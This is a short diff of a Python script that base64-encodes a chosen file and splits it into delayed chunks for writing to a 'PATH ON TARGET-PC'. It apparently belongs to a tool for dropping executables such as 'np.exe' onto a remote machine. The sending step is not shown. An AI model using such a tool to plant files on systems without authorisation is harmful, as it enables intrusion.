@@ -1,12 +1,16 @@
 import requests
+import base64
 import time
 
 chunk_size = 1500
 delay = 8
-output_path = "D:\\np.exe"
 
-with open("exefile.txt", "r") as f:
-    b64 = f.read().replace("\r", "").replace("\n", "")
+file = input("FILE TO UPLOAD> ")
+output_path = input("PATH ON TARGET-PC> ")
+
+with open(file, "rb") as f:
+    data = f.read()
+    b64 = base64.b64encode(data).decode("UTF-8")
 
 # Split into Base64 encoded string into chunks 
 chunks = [b64[i:i+chunk_size] for i in range(0, len(b64), chunk_size)]
